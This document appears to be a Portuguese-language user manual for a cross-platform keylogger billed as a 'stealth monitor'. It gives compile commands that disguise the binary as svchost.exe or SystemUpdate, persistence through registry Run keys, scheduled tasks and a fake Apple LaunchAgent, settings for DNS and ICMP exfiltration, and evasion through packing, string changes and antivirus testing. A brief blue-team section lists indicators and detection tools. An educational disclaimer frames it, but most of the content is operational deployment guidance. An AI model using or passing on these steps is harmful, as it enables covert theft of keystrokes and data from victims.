# 📖 MANUAL DE INSTRUÇÕES - Monitor Stealth Multi-Plataforma

## ⚠️ AVISO LEGAL OBRIGATÓRIO

**🚨 ESTE SOFTWARE É DESTINADO EXCLUSIVAMENTE PARA:**
- 🎓 Pesquisa acadêmica em segurança cibernética
- 🔵 Treinamento de Blue Team (detecção e resposta)
- 🔴 Treinamento de Red Team (técnicas de evasão)
- 🧪 Análise científica de comportamento de sistemas
- 📚 Fins educacionais em ambientes controlados

**❌ NÃO USE PARA ATIVIDADES ILEGAIS! ❌**
**⚖️ O usuário é responsável pelo uso ético e legal desta ferramenta.**

---

## 🚀 INSTALAÇÃO E COMPILAÇÃO

### **Pré-requisitos**

#### **Linux (Ubuntu/Debian)**
```bash
# Instalar dependências
sudo apt-get update
sudo apt-get install build-essential gcc
sudo apt-get install libx11-dev libxext-dev libxtst-dev
sudo apt-get install mingw-w64  # Para cross-compile Windows
```

#### **macOS**
```bash
# Instalar Xcode Command Line Tools
xcode-select --install

# Ou via Homebrew
brew install gcc
```

#### **Windows**
```bash
# MinGW ou Visual Studio
# Baixar de: https://www.mingw-w64.org/
```

### **Compilação Automática**
```bash
cd /home/felipe-macedo/cyber-projects/learning-c-so/build
chmod +x build_all.sh
./build_all.sh
```

### **Compilação Manual**

#### **Linux**
```bash
cd linux/
gcc -O3 -s -o system-monitor linux_stealth_monitor.c -lX11 -lXext -lpthread
```

#### **Windows (Cross-compile)**
```bash
cd windows/
x86_64-w64-mingw32-gcc -O3 -s -mwindows -static \
    -o svchost.exe win_stealth_monitor.c \
    -luser32 -lkernel32 -ladvapi32 -lpsapi -lws2_32
```

#### **macOS**
```bash
cd macos/
clang -O3 -framework CoreFoundation -framework CoreGraphics \
      -framework ApplicationServices -framework Carbon \
      -o SystemUpdate macos_stealth_monitor.c
```

---

## 🎯 USO POR PLATAFORMA

### **🐧 LINUX**

#### **Execução Básica**
```bash
# Executar em modo normal
./system-monitor

# Executar como root (recomendado)
sudo ./system-monitor

# Executar em background
nohup sudo ./system-monitor &
```

#### **Verificar Execução**
```bash
# Verificar processo
ps aux | grep system-monitor

# Verificar logs do sistema
journalctl -f | grep system-monitor

# Verificar arquivo de lock
ls -la /tmp/.monitor_lock
```

#### **Parar Execução**
```bash
# Matar processo
sudo pkill system-monitor

# Remover persistência
sudo systemctl stop system-monitor.service
sudo systemctl disable system-monitor.service
sudo rm /etc/systemd/system/system-monitor.service
```

### **🪟 WINDOWS**

#### **Execução Básica**
```cmd
REM Executar como Administrador (OBRIGATÓRIO)
svchost.exe

REM Ou via PowerShell como Admin
Start-Process svchost.exe -Verb RunAs
```

#### **Verificar Execução**
```cmd
REM Verificar processo
tasklist | findstr svchost

REM Verificar persistência
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
schtasks /query | findstr "Automatic App Update"
```

#### **Parar Execução**
```cmd
REM Matar processo
taskkill /f /im svchost.exe

REM Remover persistência
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" /f
schtasks /delete /tn "Microsoft\Windows\WindowsUpdate\Automatic App Update" /f
```

### **🍎 macOS**

#### **Execução Básica**
```bash
# Executar aplicação
./SystemUpdate.app/Contents/MacOS/SystemUpdate

# Ou executar bundle completo
open SystemUpdate.app
```

#### **Permissões Necessárias**
1. **System Preferences** → **Security & Privacy**
2. **Privacy** → **Accessibility**
3. Adicionar **SystemUpdate** à lista
4. Marcar checkbox para habilitar

#### **Verificar Execução**
```bash
# Verificar processo
ps aux | grep SystemUpdate

# Verificar LaunchAgent
launchctl list | grep com.apple.systemupdate
```

#### **Parar Execução**
```bash
# Matar processo
pkill SystemUpdate

# Remover persistência
launchctl unload ~/Library/LaunchAgents/com.apple.systemupdate.plist
rm ~/Library/LaunchAgents/com.apple.systemupdate.plist
```

---

## 🔧 CONFIGURAÇÃO AVANÇADA

### **Personalizar Exfiltração**

#### **Alterar Domínio DNS**
```c
// Em network.h, linha ~45
snprintf(query, sizeof(query), "%s.SEUDOMINIO.com", fragment);
```

#### **Alterar Servidor ICMP**
```c
// Em network.h, linha ~58
addr.sin_addr.s_addr = inet_addr("SEU.IP.AQUI");
```

### **Ajustar Frequência**
```c
// Alterar delay entre exfiltrações
usleep(200000); // 200ms (padrão)
usleep(500000); // 500ms (mais stealth)
```

### **Modificar Buffer Size**
```c
// Em crypto.h, alterar tamanho do buffer
uint8_t data[4096]; // 4KB (padrão)
uint8_t data[8192]; // 8KB (mais dados)
```

---

## 🔍 MONITORAMENTO E DETECÇÃO

### **Para Blue Team - Como Detectar**

#### **Indicadores de Compromisso (IOCs)**
```bash
# Processos suspeitos
ps aux | grep -E "(system-monitor|svchost|SystemUpdate)"

# Arquivos temporários
find /tmp -name ".sys_*" -o -name ".monitor_lock"

# Conexões de rede suspeitas
netstat -tulpn | grep -E "(53|8080|443)"

# Queries DNS anômalas
tail -f /var/log/syslog | grep -i dns
```

#### **Ferramentas de Detecção**
```bash
# Sysmon (Windows)
# Configurar para detectar hooks de baixo nível

# YARA Rules
yara stealth_keylogger.yar /path/to/binaries/

# Wireshark
# Filtrar: dns.qry.name contains "yourdomain"

# Volatility (análise de memória)
volatility -f memory.dump --profile=Linux pslist
```

### **Para Red Team - Evasão**

#### **Técnicas Implementadas**
- ✅ **Anti-debugging**: Múltiplas verificações
- ✅ **Anti-VM**: Detecção de virtualização
- ✅ **Process hiding**: Nomes genéricos do sistema
- ✅ **Timing delays**: Evitar detecção por comportamento
- ✅ **Encrypted storage**: Dados criptografados em memória

#### **Melhorar Stealth**
```bash
# Compilar com ofuscação
gcc -O3 -s -fno-stack-protector -fomit-frame-pointer

# Usar packer
upx --ultra-brute binary

# Modificar strings
sed -i 's/yourdomain/legitdomain/g' source.c
```

---

## 🧪 AMBIENTE DE LABORATÓRIO

### **Configuração Recomendada**

#### **VMs Isoladas**
```bash
# VMware/VirtualBox com:
- Windows 10/11 (target)
- Ubuntu 20.04+ (target)
- macOS Big Sur+ (target)
- Kali Linux (análise)
- Rede isolada (NAT apenas)
```

#### **Ferramentas de Análise**
```bash
# Instalar em VM de análise:
sudo apt-get install wireshark tcpdump
sudo apt-get install volatility3 yara
sudo apt-get install ghidra radare2
pip3 install pefile
```

### **Cenários de Teste**

#### **1. Teste de Funcionalidade**
```bash
# Executar monitor
# Digitar em diferentes aplicações
# Verificar captura de dados
# Confirmar exfiltração
```

#### **2. Teste de Persistência**
```bash
# Instalar monitor
# Reinicializar sistema
# Verificar se reinicia automaticamente
# Testar sobrevivência a updates
```

#### **3. Teste de Detecção**
```bash
# Instalar EDR/AV
# Executar monitor
# Verificar se é detectado
# Analisar logs de segurança
```

#### **4. Teste de Evasão**
```bash
# Modificar assinaturas
# Alterar comportamento
# Testar contra diferentes AVs
# Medir tempo de detecção
```

---

## 📊 ANÁLISE DE DADOS

### **Localização dos Dados**

#### **Linux**
```bash
# Arquivos temporários
/tmp/.sys_*

# Logs do sistema
/var/log/syslog
journalctl -u system-monitor
```

#### **Windows**
```cmd
REM Logs de eventos
eventvwr.msc

REM Arquivos temporários
%TEMP%\*.tmp

REM Registry
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

#### **macOS**
```bash
# Console logs
/var/log/system.log
log show --predicate 'process == "SystemUpdate"'

# LaunchAgent logs
~/Library/Logs/
```

### **Decodificar Dados**
```python
# Script Python para decodificar Base64
import base64

def decode_exfiltrated_data(encoded_string):
    try:
        decoded = base64.b64decode(encoded_string)
        return decoded.decode('utf-8', errors='ignore')
    except:
        return "Erro na decodificação"

# Uso
data = "SGVsbG8gV29ybGQ="  # Exemplo
print(decode_exfiltrated_data(data))
```

---

## 🛡️ CONTRAMEDIDAS E PROTEÇÃO

### **Prevenção**
```bash
# Monitoramento de APIs críticas
# Whitelist de processos autorizados
# Análise comportamental em tempo real
# Sandboxing de aplicações suspeitas
```

### **Detecção**
```bash
# EDR com regras customizadas
# SIEM com correlação de eventos
# Honeypots para capturar atividade
# Machine Learning para anomalias
```

### **Resposta**
```bash
# Isolamento automático do endpoint
# Coleta de evidências forenses
# Análise de impacto
# Remediação e hardening
```

---

## 🆘 TROUBLESHOOTING

### **Problemas Comuns**

#### **Não Compila**
```bash
# Verificar dependências
pkg-config --exists x11 && echo "OK" || echo "Instalar libx11-dev"

# Verificar compilador
gcc --version
```

#### **Não Executa**
```bash
# Verificar permissões
chmod +x binary

# Verificar dependências runtime
ldd binary
```

#### **Não Captura Eventos**
```bash
# Linux: Verificar X11
echo $DISPLAY

# Windows: Executar como Admin
# macOS: Verificar permissões Accessibility
```

#### **Não Exfiltra Dados**
```bash
# Verificar conectividade
ping 8.8.8.8

# Verificar DNS
nslookup yourdomain.com

# Verificar firewall
sudo ufw status
```

---

## 📚 RECURSOS ADICIONAIS

### **Documentação Técnica**
- `research/detection_techniques.md` - Técnicas de detecção
- `research/usage_guide.md` - Guia de uso científico
- `ANALYSIS_REPORT.md` - Relatório de análise completa

### **Referências Científicas**
- MITRE ATT&CK Framework
- NIST Cybersecurity Framework
- OWASP Testing Guide
- CVE Database

### **Comunidade Científica**
- Conferences: BlackHat, DEF CON, BSides
- Journals: IEEE Security & Privacy
- Forums: /r/netsec, Security StackExchange

---

## 🎓 OBJETIVOS EDUCACIONAIS

### **Conhecimentos Adquiridos**
- ✅ APIs de baixo nível em diferentes SOs
- ✅ Técnicas de evasão e anti-detecção
- ✅ Métodos de persistência multiplataforma
- ✅ Exfiltração por canais não convencionais
- ✅ Desenvolvimento de contramedidas

### **Habilidades Desenvolvidas**
- ✅ Programação em C para sistemas
- ✅ Análise de malware e reverse engineering
- ✅ Desenvolvimento de regras de detecção
- ✅ Resposta a incidentes de segurança
- ✅ Pesquisa em segurança cibernética

---

**🔬 "A ciência da computação não é sobre computadores, assim como a astronomia não é sobre telescópios." - Edsger Dijkstra**

**VIVA A CIÊNCIA DA COMPUTAÇÃO! 🚀⚡**

---

*Manual criado para fins educacionais e de pesquisa. Use com responsabilidade e dentro da legalidade.*